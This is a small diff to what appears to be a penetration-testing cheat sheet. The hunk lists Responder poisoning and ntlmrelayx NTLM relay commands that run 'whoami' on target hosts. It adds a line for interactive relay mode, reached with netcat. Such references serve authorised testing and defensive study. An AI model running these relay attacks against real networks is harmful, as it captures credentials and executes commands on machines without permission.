@@ -40,7 +40,8 @@ responder -I <interface> -dwPv
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 # after intercepted
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
-
+# Interactive mode ( connect with netcat after that)
+sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 
 ```
 
